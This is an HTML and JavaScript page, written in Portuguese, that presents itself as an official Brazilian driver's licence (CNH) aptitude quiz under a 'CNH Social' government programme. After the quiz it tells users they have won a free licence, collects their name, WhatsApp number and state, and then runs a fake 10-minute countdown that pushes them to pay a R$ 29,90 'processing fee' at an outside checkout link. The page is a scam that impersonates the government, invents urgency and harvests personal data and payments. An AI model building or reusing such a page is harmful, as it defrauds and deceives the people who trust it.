<!DOCTYPE html><html lang="pt-BR"><head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>AvaliaÃ§Ã£o Oficial CNH â€” Teste RÃ¡pido</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;900&display=swap');
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700;900&display=swap');

body {
    margin:0;
    font-family: 'Roboto', sans-serif;
    background: linear-gradient(to bottom, #f3f5f7, #e0e5ec);
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
    padding: 20px 0;
}

.quiz-container {
    width: 95%;
    max-width: 720px;
    background:#fff;
    border-radius:15px;
    box-shadow:0 15px 40px rgba(0,0,0,0.2);
    overflow:hidden;
    position: relative;
    font-family: 'Poppins', sans-serif; 
}

.header {
    background: linear-gradient(90deg,#002b7f,#0041c2);
    color:#fff;
    padding:20px 30px;
    text-align:center;
    box-shadow:0 5px 15px rgba(0,0,0,0.1);
}

.header h1 { margin:0; font-size:1.8rem; }
.header p { margin:5px 0 0 0; font-size:1rem; opacity:0.9; }

/* Estilos do Quiz */
.progress-container {
    width:100%;
    height:10px;
    background:#ddd;
    border-radius:5px;
    overflow:hidden;
    margin-top:10px;
}

.progress-bar {
    height:10px;
    width:0%;
    background: linear-gradient(90deg,#ffcb05,#002b7f);
    transition: width 0.4s ease;
}

.question-count { font-size:0.85rem; color:#555; margin:10px 0; text-align:right; padding-right:15px; }

.question { text-align:center; margin:20px; }
.question-emoji { font-size:4rem; display:block; margin-bottom:10px; }
.question-title { font-size:1.6rem; font-weight:700; color:#002b7f; }
.question-subtitle { font-size:0.9rem; color:#555; margin-top:5px; }

.options { display:grid; grid-template-columns:1fr 1fr; gap:15px; margin:20px; }

.option-card {
    background: linear-gradient(145deg,#ffffff,#e0e5ec);
    border-radius:15px;
    padding:18px;
    text-align:center;
    font-size:1rem;
    cursor:pointer;
    transition: all 0.3s ease;
    box-shadow:0 5px 15px rgba(0,0,0,0.1);
    display:flex;
    align-items:center;
    justify-content:center;
    gap:8px;
    user-select:none;
}

.option-card:hover { transform:scale(1.05); box-shadow:0 8px 25px rgba(0,0,0,0.2); }
.option-card.selected { animation: shine 0.5s forwards; }
.option-card.correct { background:#4caf50; color:#fff; box-shadow:0 0 15px 3px gold; }
.option-card.wrong { background:#f44336; color:#fff; box-shadow:0 0 15px 3px red; }

@keyframes shine {
    0% { box-shadow: 0 0 0px gold; transform:scale(1); }
    50% { box-shadow: 0 0 20px gold; transform:scale(1.05); }
    100% { box-shadow: 0 0 5px gold; transform:scale(1); }
}

#nextBtn {
    margin:15px 20px 25px 20px;
    background:#002b7f;
    color:#fff;
    border:none;
    padding:15px;
    border-radius:12px;
    cursor:pointer;
    font-size:1.1rem;
    width:calc(100% - 40px);
    transition: all 0.3s ease;
}

#nextBtn:hover { background:#001f5f; }

.footer { font-size:0.8rem; color:#555; text-align:center; margin-bottom:15px; }

/* --- TELA DE TRANSIÃ‡ÃƒO (NOVA TELA) --- */
.transition-container {
    padding: 50px 20px;
    text-align: center;
    background: #f0f7ff;
    position: relative; /* Para posicionar os confetes */
}

/* Confetes */
.confetti {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    pointer-events: none;
    overflow: hidden;
    z-index: 5;
}

.confetti-piece {
    position: absolute;
    width: 10px;
    height: 20px;
    background: #ffcc00;
    opacity: 0;
    animation: fall 3s infinite;
    z-index: 10;
}

@keyframes fall {
    0% { transform: translate(0, -100px) rotate(0deg); opacity: 1; }
    100% { transform: translate(100px, 100vh) rotate(720deg); opacity: 0; }
}

.transition-container h2 {
    font-size: 2.2rem;
    color: #4CAF50;
    margin-bottom: 25px;
    font-weight: 900;
}

.loading-bar {
    width: 80%;
    margin: 30px auto 40px auto;
    height: 15px;
    background: #e0e0e0;
    border-radius: 10px;
    overflow: hidden;
    box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
}

#loading-progress {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg, #002b7f, #0041c2);
    border-radius: 10px;
    transition: width 3s ease-in-out; /* 3 segundos de carregamento */
}

#validation-message {
    font-size: 1.1rem;
    color: #002b7f;
    margin-bottom: 30px;
    font-weight: 700;
    min-height: 25px;
}

.category-selection h3 {
    font-size: 1.4rem;
    color: #002b7f;
    margin-bottom: 25px;
    font-weight: 700;
}

.category-options {
    display: flex;
    flex-direction: column;
    gap: 15px;
    margin-bottom: 40px;
}

.category-btn {
    background: linear-gradient(90deg,#ffcb05,#ff9800);
    color: #002b7f;
    border: none;
    padding: 15px 20px;
    border-radius: 12px;
    cursor: pointer;
    font-size: 1.1rem;
    width: 100%;
    transition: all 0.3s ease;
    font-weight: 700;
    box-shadow: 0 5px 15px rgba(0,0,0,0.1);
}
.category-btn:hover {
    transform: scale(1.02);
    background: linear-gradient(90deg,#ff9800,#ffcb05);
}
.category-btn.selected {
    border: 3px solid #4CAF50;
    transform: scale(1.05);
    box-shadow: 0 0 15px #4CAF50;
}


/* --- ESTILOS PADRÃƒO E DE TRANSIÃ‡ÃƒO --- */

.quiz-content { transition: opacity 0.5s; }
.hidden { display: none !important; }

/* TELA 1 - RESULTADO E FORMULÃRIO */
.result-container {
    padding: 30px 20px;
    text-align: center;
}
.result-container h2 { font-size: 2rem; color: #4CAF50; margin-bottom: 10px; font-weight: 900; }
.result-container .score-display { font-size: 1.2rem; color: #002b7f; margin-bottom: 20px; font-weight: 700; }
.result-container .score-display strong { font-size: 1.8rem; color: #ffcb05; }
.result-message { font-size: 1rem; color: #333; margin-bottom: 25px; line-height: 1.4; background: #e9f5e9; padding: 15px; border-radius: 10px; border-left: 5px solid #4CAF50; }
.form-title { font-size: 1.3rem; color: #002b7f; margin-top: 30px; margin-bottom: 15px; font-weight: 700; }
.form-group { margin-bottom: 15px; }
.form-group input, .form-group select { width: calc(100% - 20px); padding: 12px 10px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; box-sizing: border-box; transition: border-color 0.3s; }
.form-group input:focus, .form-group select:focus { border-color: #002b7f; outline: none; box-shadow: 0 0 5px rgba(0, 43, 127, 0.3); }
#submitBtn { background: linear-gradient(90deg,#4CAF50,#2e7d32); color: #fff; border: none; padding: 15px; border-radius: 12px; cursor: pointer; font-size: 1.2rem; width: 100%; margin-top: 20px; margin-bottom: 10px; transition: background 0.3s ease; font-weight: 700; }
#submitBtn:hover { background: linear-gradient(90deg,#2e7d32,#1b5e20); }

/* --- TELA 2 - CONFIRMAÃ‡ÃƒO DE PAGAMENTO (PREMIUM) --- */

.payment-container {
    padding: 40px;
    text-align: center;
    background: #fcfcfc;
}

.payment-container h2 {
    font-size: 2.2rem;
    color: #002b7f;
    margin-bottom: 10px;
    font-weight: 900;
    line-height: 1.2;
}

.success-message-2 {
    font-size: 1.1rem;
    color: #4CAF50;
    margin-bottom: 30px;
    font-weight: 700;
    border-bottom: 2px solid #eee;
    padding-bottom: 15px;
}

/* CronÃ´metro de UrgÃªncia */
.timer-box {
    background: #ff4500; 
    color: #fff;
    padding: 15px 25px;
    border-radius: 15px;
    margin: 30px 0;
    font-size: 1.2rem;
    font-weight: 600;
    box-shadow: 0 8px 15px rgba(255, 69, 0, 0.4);
    border: 2px solid #ffcb05;
}

#countdown {
    font-size: 3.5rem;
    font-weight: 900;
    display: block;
    margin: 5px 0 10px 0;
    color: #ffcb05; 
    letter-spacing: 2px;
}

/* Justificativa da Taxa */
.justification {
    text-align: left;
    margin: 35px 0;
    padding: 25px;
    background: #f8faff;
    border-radius: 15px;
    border: 1px solid #e0e7ff;
}

.justification h3 {
    font-size: 1.6rem;
    color: #002b7f;
    margin-top: 0;
    border-bottom: 3px solid #ffcb05;
    padding-bottom: 10px;
    font-weight: 700;
    text-align: center;
}

.justification strong {
    color: #ff4500;
    font-weight: 700;
}

.cost-breakdown {
    list-style: none;
    padding: 0;
    margin: 20px 0;
}

.cost-breakdown li {
    display: flex;
    justify-content: space-between;
    padding: 8px 0;
    border-bottom: 1px dashed #ddd;
    font-size: 1rem;
    color: #333;
}

.cost-breakdown li:last-child {
    border-bottom: none;
    font-weight: 700;
    color: #002b7f;
    font-size: 1.1rem;
}

.cost-breakdown li span:first-child { font-weight: 600; }

#payBtn {
    background: linear-gradient(90deg,#ffcb05,#ff9800);
    color: #002b7f;
    border: none;
    padding: 22px;
    border-radius: 15px;
    cursor: pointer;
    font-size: 1.5rem;
    width: 100%;
    transition: all 0.4s ease;
    font-weight: 900;
    text-transform: uppercase;
    box-shadow: 0 10px 20px rgba(255, 152, 0, 0.4);
    letter-spacing: 1px;
    transform: scale(1.02);
}

#payBtn:hover {
    background: linear-gradient(90deg,#ff9800,#ffcb05);
    transform: scale(1.05);
}
.small-print { font-size: 0.85rem; color: #888; margin-top: 20px; }
</style>
</head>
<body>

<div class="quiz-container">
    <div class="header">
        <h1>AvaliaÃ§Ã£o Oficial de AptidÃ£o CNH</h1>
        <p>Teste rÃ¡pido para concorrer a uma CNH gratuita!</p>
        <div class="progress-container">
            <div class="progress-bar" id="progress-bar"></div>
        </div>
    </div>

    <div id="quiz-content" class="quiz-content">
        <div class="question-count" id="question-count">1/31</div>

        <div class="question">
            <span class="question-emoji" id="question-emoji">ğŸš¦</span>
            <div class="question-title" id="question-title">Pergunta Principal</div>
            <div class="question-subtitle">Todas as perguntas sÃ£o orientativas e seguem o conteÃºdo do exame teÃ³rico e psicotÃ©cnico.</div>
        </div>

        <div class="options" id="options"></div>

        <button id="nextBtn">PrÃ³xima Pergunta</button>

        <div class="footer">
            PontuaÃ§Ã£o mÃ­nima para aptidÃ£o: 23/31
        </div>
    </div>

    <div id="transition-screen" class="transition-container hidden">
        <div class="confetti" id="confetti-container"></div>
        
        <div id="loading-phase">
            <h2 style="color: #002b7f;">AnÃ¡lise de AptidÃ£o Final</h2>
            <p id="validation-message" style="font-size: 1.1rem; color: #002b7f; font-weight: 700; margin-bottom: 30px;">
                Estamos Validando Sua PontuaÃ§Ã£o e Elegibilidade...
            </p>

            <div class="loading-bar">
                <div id="loading-progress"></div>
            </div>
            <div class="footer" style="margin-top:40px;">
                Aguarde. Processamento de dados via sistema oficial.
            </div>
        </div>

        <div id="choice-phase" class="hidden">
             <h2 style="color: #4CAF50; font-size: 2.5rem;">ğŸ‰ APROVAÃ‡ÃƒO E VAGA GARANTIDAS!</h2>
             <p style="font-size: 1.1rem; color: #333; margin-bottom: 30px;">
                 ParabÃ©ns! Sua pontuaÃ§Ã£o garantiu uma CNH **100% gratuita** pelo programa.
             </p>

             <div class="category-selection">
                 <h3>Selecione a Categoria da sua CNH Gratuita:</h3>
                 <div class="category-options">
                     <button class="category-btn" data-category="A">ğŸ›µ Categoria A (Moto) - Vaga Gratuita</button>
                     <button class="category-btn" data-category="B">ğŸš— Categoria B (Carro) - Vaga Gratuita</button>
                     <button class="category-btn" data-category="AB">ğŸï¸ Categoria A e B (Moto e Carro) - Vaga Gratuita</button>
                 </div>
                 <p style="font-size: 0.9rem; color: #ff4500; font-weight: 600;">*Apenas uma categoria pode ser selecionada.</p>
             </div>
        </div>

    </div>
    <div id="result-screen" class="result-container hidden">
        <h2>âœ… ParabÃ©ns! VocÃª foi Aprovado!</h2>
        
        <div class="score-display">
            VocÃª atingiu a qualificaÃ§Ã£o com <strong id="final-score">X de 31</strong> acertos.
        </div>
        
        <p class="result-message">
            VocÃª demonstrou preparo no exame teÃ³rico e psicotÃ©cnico, atingindo a pontuaÃ§Ã£o mÃ­nima para ser considerado(a) **qualificado(a)** ao programa CNH Social.
        </p>
        <div id="selected-cnh-display" style="font-size: 1.2rem; color: #ff9800; font-weight: 900; margin-bottom: 20px;">
             Sua escolha: <span id="cnh-chosen"></span>
        </div>

        <p class="form-title">
            Passo 2: PrÃ©-cadastro Oficial para Reserva da Vaga
        </p>
        
        <form id="pre-cadastro-form">
            <div class="form-group">
                <input type="text" id="nome" placeholder="Seu Nome Completo" required="">
            </div>
            <div class="form-group">
                <input type="tel" id="whatsapp" placeholder="WhatsApp (DDD + NÃºmero)" required="">
            </div>
            <div class="form-group">
                <select id="estado" required="">
                    <option value="">Selecione Seu Estado (UF)</option>
                    <option value="AC">Acre</option>
                    <option value="AL">Alagoas</option>
                    <option value="AP">AmapÃ¡</option>
                    <option value="AM">Amazonas</option>
                    <option value="BA">Bahia</option>
                    <option value="CE">CearÃ¡</option>
                    <option value="DF">Distrito Federal</option>
                    <option value="ES">EspÃ­rito Santo</option>
                    <option value="GO">GoiÃ¡s</option>
                    <option value="MA">MaranhÃ£o</option>
                    <option value="MT">Mato Grosso</option>
                    <option value="MS">Mato Grosso do Sul</option>
                    <option value="MG">Minas Gerais</option>
                    <option value="PA">ParÃ¡</option>
                    <option value="PB">ParaÃ­ba</option>
                    <option value="PR">ParanÃ¡</option>
                    <option value="PE">Pernambuco</option>
                    <option value="PI">PiauÃ­</option>
                    <option value="RJ">Rio de Janeiro</option>
                    <option value="RN">Rio Grande do Norte</option>
                    <option value="RS">Rio Grande do Sul</option>
                    <option value="RO">RondÃ´nia</option>
                    <option value="RR">Roraima</option>
                    <option value="SC">Santa Catarina</option>
                    <option value="SP">SÃ£o Paulo</option>
                    <option value="SE">Sergipe</option>
                    <option value="TO">Tocantins</option>
                </select>
            </div>
            <button type="submit" id="submitBtn">Garantir Minha CNH Gratuita Agora</button>
        </form>
        <div class="footer" style="margin-top:20px;">
            A CNH Social Ã© um programa do Governo Federal/Estadual.
        </div>
    </div>

    <div id="payment-screen" class="payment-container hidden">
        <h2>VocÃª estÃ¡ Quase LÃ¡! Sua CNH Gratuita estÃ¡ Confirmada! ğŸ¥³</h2>
        <p class="success-message-2">
            ParabÃ©ns pela sua **aprovaÃ§Ã£o prioritÃ¡ria** no Teste de AptidÃ£o. Seu resultado garante sua qualificaÃ§Ã£o no programa CNH Social.
        </p>

        <div class="timer-box">
            ğŸš¨ **ALERTA DE VAGA ÃšNICA!** Sua reserva expira em:
            <span id="countdown">10:00</span>
            <p style="font-size: 0.9rem; margin: 5px 0 0 0; font-weight: 400; color: #fff;">(ApÃ³s o tempo, a vaga Ã© liberada para o prÃ³ximo candidato qualificado na fila.)</p>
        </div>

        <div class="justification">
            <h3>Por Que a Taxa Ãšnica de R$ 29,90 Ã© NecessÃ¡ria?</h3>
            
            <p>Como aprovado(a), sua CNH (que custaria mais de R$ 2.000) Ã© **100% gratuita**. O valor de **R$ 29,90** Ã© uma **Taxa de Processamento e EmissÃ£o de Documentos** obrigatÃ³ria para a validaÃ§Ã£o final da sua vaga, conforme as diretrizes operacionais do programa.</p>
            
            <ul class="cost-breakdown">
                <li><span>Custo da CNH Completa:</span> <span>R$ 2.000+</span></li>
                <li><span>Seu Desconto CNH Social:</span> <span style="color: #ff4500;">- R$ 2.000+</span></li>
                <li><span>Taxa de Processamento (ValidaÃ§Ã£o e EmissÃ£o de Certificado):</span> <span>R$ 29,90</span></li>
                <li style="border-top: 1px solid #ddd;"><span>Seu Custo Total Final:</span> <span>R$ 29,90</span></li>
            </ul>

            <p>Ao pagar a taxa agora, vocÃª garante o **processamento imediato de prioridade** e a **reserva da sua vaga** antes que o tempo se esgote e ela seja transferida. **Esta Ã© a ÃšNICA CHANCE de confirmar sua participaÃ§Ã£o.**</p>
        </div>

        <button id="payBtn">Confirmar o PrÃ©-cadastro e Pagar Taxa Ãšnica de R$ 29,90</button>
        
        <p class="small-print">Seu pagamento Ã© processado pela plataforma de checkout seguro e garante a reserva da sua vaga no sistema do Governo.</p>
    </div>

</div>

<audio id="click-sound" src="https://freesound.org/data/previews/170/170932_2437358-lq.mp3"></audio>

<script>
// Array de perguntas do quiz
const questions = [
    {emoji:"ğŸš¦", titulo:"O que significa uma luz vermelha no semÃ¡foro?", opcoes:["â›” Parar","âš ï¸ AtenÃ§Ã£o","ğŸŸ¢ Seguir","ğŸš— Reduzir velocidade"], correta:0},
    {emoji:"ğŸ›£ï¸", titulo:"VocÃª estÃ¡ em uma via de mÃ£o Ãºnica. Qual regra deve seguir?", opcoes:["â†©ï¸ Pode fazer retorno","â¡ï¸ Apenas seguir a mÃ£o da via","â†”ï¸ Pode mudar sentido","ğŸ›‘ Parar sempre"], correta:1},
    {emoji:"ğŸ§ ", titulo:"Se A > B e B > C, entÃ£o A > C?", opcoes:["âœ… Sim","âŒ NÃ£o","âš ï¸ Depende","ğŸ¤” NÃ£o sei"], correta:0},
    {emoji:"ğŸï¸", titulo:"DistÃ¢ncia mÃ­nima segura entre veÃ­culos em estrada seca?", opcoes:["ğŸš— 2 segundos","ğŸš• 1 segundo","ğŸš™ 3 segundos","ğŸ›‘ 0,5 segundo"], correta:0},
    {emoji:"ğŸš—", titulo:"Sinal correto ao ultrapassar outro veÃ­culo?", opcoes:["â†—ï¸ Seta direita","â†–ï¸ Seta esquerda","âš ï¸ Farol alto","ğŸ’¨ Nenhum"], correta:0},
    {emoji:"ğŸ›‘", titulo:"O que significa uma placa de 'Pare'?", opcoes:["â›” Parar obrigatoriamente","âš ï¸ AtenÃ§Ã£o e seguir","ğŸŸ¢ Pode prosseguir","ğŸš— Apenas reduzir velocidade"], correta:0},
    {emoji:"ğŸš§", titulo:"Ãrea com sinal de obras. Como deve dirigir?", opcoes:["ğŸš— Velocidade normal","âš ï¸ Reduzir e atenÃ§Ã£o","ğŸ’¨ Acelerar","ğŸ›‘ Parar totalmente"], correta:1},
    {emoji:"ğŸš¸", titulo:"PrÃ³ximo a uma escola, sinal indica?", opcoes:["ğŸ‘¶ AtenÃ§Ã£o a crianÃ§as","ğŸš— Parar o carro","ğŸƒ Corrida livre","âš ï¸ Apenas reduzir velocidade"], correta:0},
    {emoji:"ğŸ§ ", titulo:"Teste de atenÃ§Ã£o: qual figura Ã© diferente das demais?", opcoes:["ğŸŸ¢ Quadrado","ğŸŸ¦ Quadrado","ğŸŸ¥ Quadrado","ğŸ”º TriÃ¢ngulo"], correta:3},
    {emoji:"âš ï¸", titulo:"VocÃª vÃª uma placa de 'Curva Perigosa Ã  Direita'. Qual atitude?", opcoes:["â¡ï¸ Reduzir velocidade","ğŸ’¨ Manter velocidade","â†©ï¸ Retroceder","ğŸš— Ultrapassar"], correta:0},
    {emoji:"ğŸ§©", titulo:"Teste de memÃ³ria: qual padrÃ£o segue apÃ³s ğŸ”µğŸ”´ğŸ”µ?", opcoes:["ğŸ”´ğŸ”µğŸ”´","ğŸ”µğŸ”´ğŸ”µ","ğŸŸ¢ğŸŸ¢ğŸ”´","ğŸ”´ğŸ”´ğŸ”µ"], correta:0},
    {emoji:"ğŸš¦", titulo:"SemÃ¡foro com luz amarela. O que fazer?", opcoes:["âš ï¸ Reduzir e parar se necessÃ¡rio","â›” Parar sempre","ğŸŸ¢ Acelerar","ğŸš— Ignorar"], correta:0},
    {emoji:"ğŸ›‘", titulo:"Parada obrigatÃ³ria: o que Ã© permitido?", opcoes:["ğŸš— Prosseguir somente se seguro","ğŸ’¨ Acelerar","â†©ï¸ Fazer retorno direto","âš ï¸ Reduzir apenas"], correta:0},
    {emoji:"ğŸï¸", titulo:"VocÃª deseja ultrapassar em via de pista dupla. CondiÃ§Ã£o correta?", opcoes:["â†—ï¸ Seta e verificar seguranÃ§a","ğŸ’¨ Acelerar sem olhar","ğŸ›‘ Esperar sem sinal","â†©ï¸ Retornar primeiro"], correta:0},
    {emoji:"ğŸ§ ", titulo:"Se uma sequÃªncia lÃ³gica Ã© 2,4,6,8, qual prÃ³ximo nÃºmero?", opcoes:["10","12","9","11"], correta:0},
    {emoji:"ğŸš—", titulo:"Qual Ã© a velocidade mÃ¡xima em Ã¡rea urbana padrÃ£o?", opcoes:["50 km/h","30 km/h","70 km/h","60 km/h"], correta:0},
    {emoji:"ğŸ›£ï¸", titulo:"Como identificar via de mÃ£o dupla?", opcoes:["SinalizaÃ§Ã£o e faixa central","Sem sinal Ã© sempre mÃ£o Ãºnica","Placas somente","NÃ£o Ã© possÃ­vel identificar"], correta:0},
    {emoji:"ğŸ§©", titulo:"Qual figura completa a sequÃªncia ğŸ”ºâ¬›â¬›ğŸ”ºâ¬›?", opcoes:["â¬›","ğŸ”º","â¬œ","ğŸ”µ"], correta:0},
    {emoji:"ğŸš§", titulo:"Em pista em obras, linha contÃ­nua branca significa?", opcoes:["NÃ£o ultrapassar","Pode ultrapassar","Parar","Reduzir velocidade"], correta:0},
    {emoji:"ğŸš¸", titulo:"Pedestres atravessando fora da faixa. Como agir?", opcoes:["âš ï¸ Reduzir e parar se necessÃ¡rio","ğŸ’¨ Acelerar","â†©ï¸ Dar rÃ©","ğŸ›‘ Ignorar"], correta:0},
    {emoji:"ğŸ§ ", titulo:"Qual das imagens nÃ£o pertence ao grupo?", opcoes:["ğŸš—, ğŸš•, ğŸ›µ, ğŸ ","ğŸš¦, ğŸ›‘, âš ï¸, ğŸŸ¢","ğŸ›£ï¸, ğŸ›¤ï¸, ğŸ›‘, ğŸš—","ğŸ”º, ğŸ”µ, ğŸ”´, ğŸ”º"], correta:0},
    {emoji:"ğŸï¸", titulo:"Ultrapassagem proibida em:", opcoes:["Curva sem visibilidade","Retas longas","Pistas largas","Pista dupla"], correta:0},
    {emoji:"ğŸš¦", titulo:"SemÃ¡foro piscando em amarelo significa:", opcoes:["âš ï¸ AtenÃ§Ã£o redobrada","â›” Parar","ğŸŸ¢ Seguir normal","ğŸ’¨ Acelerar"], correta:0},
    {emoji:"ğŸ§ ", titulo:"Se JoÃ£o Ã© mais alto que Pedro, e Pedro mais alto que Ana, quem Ã© o mais baixo?", opcoes:["Ana","Pedro","JoÃ£o","NÃ£o Ã© possÃ­vel"], correta:0},
    {emoji:"ğŸš—", titulo:"O que fazer ao estacionar em rua inclinada com freio de mÃ£o?", opcoes:["Rodar rodas para calÃ§ada","Deixar rodas soltas","Nada","Acelerar e parar"], correta:0},
    {emoji:"ğŸš§", titulo:"Faixa amarela contÃ­nua indica:", opcoes:["Proibido ultrapassar","Pode ultrapassar","Apenas reduzir","Parar sempre"], correta:0},
    {emoji:"ğŸ›‘", titulo:"Placa 'DÃª a preferÃªncia'. O que significa?", opcoes:["ğŸš— Parar se houver trÃ¢nsito","ğŸ’¨ Acelerar","â†©ï¸ Retornar","âš ï¸ Continuar sempre"], correta:0},
    {emoji:"ğŸ§©", titulo:"Qual item completa a sequÃªncia: â–², â–¼, â–², â–¼, ?", opcoes:["â–²","â–¼","â– ","â—‹"], correta:0},
    {emoji:"ğŸš¦", titulo:"O que fazer se o semÃ¡foro estiver apagado?", opcoes:["âš ï¸ Seguir como parada obrigatÃ³ria","ğŸ’¨ Acelerar","â†©ï¸ Retornar","ğŸš— Ignorar"], correta:0},
    {emoji:"ğŸ›£ï¸", titulo:"Em estrada com neblina, qual atitude?", opcoes:["âš ï¸ Reduzir velocidade e usar farol baixo","ğŸ’¨ Acelerar","ğŸš— Ligar farol alto","ğŸ›‘ Parar totalmente"], correta:0},
    {emoji:"ğŸï¸", titulo:"Ultrapassagem permitida apenas Ã  esquerda em pistas de mÃ£o dupla?", opcoes:["âœ… Sim","âŒ NÃ£o","âš ï¸ Depende do veÃ­culo","ğŸ¤” NÃ£o sei"], correta:0}
];

let currentQuestion = 0;
const totalQuestions = questions.length;
let score = 0; 
const MIN_SCORE = 23; 
let cnhCategory = ''; // VariÃ¡vel para armazenar a Categoria escolhida

const progressBar = document.getElementById('progress-bar');
const optionsContainer = document.getElementById('options');
const nextBtn = document.getElementById('nextBtn');
const clickSound = document.getElementById('click-sound');

const quizContent = document.getElementById('quiz-content');

// Elementos da Nova Tela de TransiÃ§Ã£o
const transitionScreen = document.getElementById('transition-screen');
const loadingPhase = document.getElementById('loading-phase');
const loadingProgress = document.getElementById('loading-progress');
const validationMessage = document.getElementById('validation-message');
const choicePhase = document.getElementById('choice-phase');
const confettiContainer = document.getElementById('confetti-container');
const categoryButtons = document.querySelectorAll('.category-btn');

// Elementos das Telas PÃ³s-Quiz
const resultScreen = document.getElementById('result-screen');
const preCadastroForm = document.getElementById('pre-cadastro-form');
const paymentScreen = document.getElementById('payment-screen'); 
const payBtn = document.getElementById('payBtn'); 
const countdownElement = document.getElementById('countdown'); 

const PAYMENT_LINK = "https://compraseguraonline.org.ua/c/caf6413b55"; // LINK DE PAGAMENTO DEFINIDO AQUI

let timerInterval;

// FunÃ§Ã£o para iniciar a animaÃ§Ã£o de Confetes
function startConfetti() {
    confettiContainer.innerHTML = '';
    const colors = ['#ffcc00', '#002b7f', '#4CAF50', '#ff4500'];
    const numPieces = 50;

    for (let i = 0; i < numPieces; i++) {
        const piece = document.createElement('div');
        piece.classList.add('confetti-piece');
        piece.style.background = colors[Math.floor(Math.random() * colors.length)];
        piece.style.left = `${Math.random() * 100}%`;
        piece.style.animationDelay = `${Math.random() * 2}s`;
        piece.style.animationDuration = `${(Math.random() * 1.5) + 1.5}s`;
        piece.style.transform = `rotate(${Math.random() * 360}deg)`;
        confettiContainer.appendChild(piece);
    }
}


function showQuestion(index){
    const q = questions[index];
    document.getElementById('question-emoji').textContent = q.emoji;
    document.getElementById('question-title').textContent = q.titulo;
    document.getElementById('question-count').textContent = `${index+1}/${totalQuestions}`;
    optionsContainer.innerHTML = '';
    
    q.opcoes.forEach((opt,i)=>{
        const card = document.createElement('div');
        card.classList.add('option-card');
        card.textContent = opt;

        card.addEventListener('click', ()=>{
            if(optionsContainer.classList.contains('answered')) return;
            clickSound.currentTime=0;
            clickSound.play();
            
            if(i === q.correta){
                card.classList.add('correct');
                score++; 
            } else {
                card.classList.add('wrong');
            }
            
            document.querySelectorAll('.option-card').forEach(c=>c.style.pointerEvents='none');
            optionsContainer.classList.add('answered');
        });

        optionsContainer.appendChild(card);
    });

    progressBar.style.width = `${((index + 1) / totalQuestions) * 100}%`;
    optionsContainer.classList.remove('answered');
}

// NOVO: FunÃ§Ã£o para mostrar a tela de Escolha da CNH apÃ³s o carregamento
function showChoiceScreen() {
    loadingPhase.classList.add('hidden');
    choicePhase.classList.remove('hidden');

    if (score >= MIN_SCORE) {
         startConfetti(); // Inicia os confetes ao mostrar a tela de sucesso/escolha
    } else {
         // LÃ³gica para reprovaÃ§Ã£o
         document.querySelector('#choice-phase h2').textContent = 'âš ï¸ Seu Perfil foi Analisado!';
         document.querySelector('#choice-phase h2').style.color = '#ff4500';
         document.querySelector('#choice-phase p').innerHTML = 'Infelizmente, sua pontuaÃ§Ã£o **nÃ£o atingiu a aptidÃ£o mÃ­nima** para a CNH gratuita.';
         document.querySelector('.category-selection h3').classList.add('hidden');
         
         // Substitui os botÃµes de escolha por um botÃ£o de "Ver Resultado"
         document.querySelector('.category-options').innerHTML = '<button id="view-final-result" class="category-btn" style="background: #002b7f; color: #fff;">Ver Resultado Final Completo</button>';
         document.getElementById('view-final-result').addEventListener('click', showResultScreen);
    }
}

// NOVO: FunÃ§Ã£o para a Tela de TransiÃ§Ã£o (com carregamento de 3s)
function showTransitionScreen() {
    quizContent.classList.add('hidden');
    transitionScreen.classList.remove('hidden');

    loadingPhase.classList.remove('hidden');
    choicePhase.classList.add('hidden');
    confettiContainer.innerHTML = '';

    // Garante que o progresso inicia em 0
    loadingProgress.style.transition = 'width 0s';
    loadingProgress.style.width = '0%';
    setTimeout(() => {
        loadingProgress.style.transition = 'width 3s ease-in-out';
    }, 50);

    validationMessage.textContent = 'Estamos Validando Sua PontuaÃ§Ã£o e Elegibilidade...';

    // Inicia o carregamento (animaÃ§Ã£o CSS)
    setTimeout(() => {
        loadingProgress.style.width = '100%'; 
    }, 100);

    // Tempo para simular a validaÃ§Ã£o (3 segundos)
    setTimeout(() => {
        showChoiceScreen(); 
    }, 3000); 
}


function showResultScreen(){
    // Esconde a transiÃ§Ã£o e mostra a tela de prÃ©-cadastro (TELA 1)
    transitionScreen.classList.add('hidden');
    resultScreen.classList.remove('hidden');

    document.getElementById('final-score').textContent = `${score} de ${totalQuestions}`;
    
    const cnhDisplay = document.getElementById('cnh-chosen');
    const displayContainer = document.getElementById('selected-cnh-display');
    
    if (cnhCategory) {
         cnhDisplay.textContent = `CNH Categoria ${cnhCategory}`;
         displayContainer.classList.remove('hidden');
    } else {
         // Se nÃ£o escolheu (porque reprovou), esconde a escolha da CNH
         displayContainer.classList.add('hidden');
    }


    if (score < MIN_SCORE) {
        document.querySelector('.result-container h2').textContent = 'âš ï¸ VocÃª nÃ£o atingiu a pontuaÃ§Ã£o mÃ­nima';
        document.querySelector('.result-container h2').style.color = '#f44336';
        document.querySelector('.result-message').innerHTML = `Sua pontuaÃ§Ã£o foi de **${score} acertos**. A pontuaÃ§Ã£o mÃ­nima Ã© **${MIN_SCORE}**. Infelizmente, vocÃª nÃ£o estÃ¡ apto(a) para a CNH Social neste momento.`;
        document.getElementById('submitBtn').style.background = '#9e9e9e';
        document.getElementById('submitBtn').style.pointerEvents = 'none';
        document.getElementById('submitBtn').textContent = 'InscriÃ§Ã£o NÃ£o Liberada';
    }
}

function startPaymentTimer(){
    // Inicia o cronÃ´metro para a TELA 2 (10 minutos)
    let timeInSeconds = 600; 
    
    function updateCountdown() {
        const minutes = Math.floor(timeInSeconds / 60);
        const seconds = timeInSeconds % 60;
        
        countdownElement.textContent = 
            `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
            
        if (timeInSeconds <= 0) {
            clearInterval(timerInterval);
            countdownElement.textContent = "00:00";
            payBtn.textContent = "TEMPO ESGOTADO. VAGA PERDIDA.";
            payBtn.disabled = true;
            payBtn.style.background = '#9e9e9e';
            payBtn.style.boxShadow = 'none';
        } else {
            timeInSeconds--;
        }
    }
    
    // Zera qualquer timer anterior e inicia um novo
    if (timerInterval) clearInterval(timerInterval);
    timerInterval = setInterval(updateCountdown, 1000);
    updateCountdown();
}

